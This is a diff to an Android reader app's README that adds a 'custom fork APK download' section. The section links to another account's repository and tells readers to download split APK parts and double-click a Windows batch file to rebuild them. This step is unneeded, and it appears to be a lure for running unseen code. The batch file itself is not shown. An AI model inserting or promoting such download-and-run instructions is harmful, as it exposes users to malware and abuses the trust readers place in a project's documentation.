@@ -91,3 +91,16 @@ it on [Ko-fi](https://ko-fi.com/jakobk).
 
 The reader view's stylesheet, in `android/app/src/main/assets/reader/`, is
 [ar5iv-css](https://github.com/dginev/ar5iv-css) by Deyan Ginev, under the MIT licence.
+
+
+## Custom fork APK download
+
+This repository also hosts the custom signed Aftergleam fork build used with the Research Widgets companion app.
+
+- **Version:** 1.8.1 (version code 14)
+- **[Download files and instructions](https://github.com/Placeholder2312/Aftergleam-For-Widgets/tree/apk-downloads/downloads)**
+- **[Download the APK parts as a ZIP](https://github.com/Placeholder2312/Aftergleam-For-Widgets/archive/refs/heads/apk-downloads.zip)**
+
+The APK is split into five parts in the `downloads` folder. Download and extract the ZIP, open `downloads`, then double-click `Aftergleam-v1.8.1-join.bat` to reconstruct the APK. SHA-256 of the reconstructed APK: `9154561556063edaf05ef6bebd0b5fc5f97237d99adbcc18dcdaaedaa0956496`.
+
+This is a custom fork build, not the upstream Aftergleam release. It was built from `feature/research-widgets-integration` at `9c1060548bc5906b31c41f6b484da5e42a7396e3`.
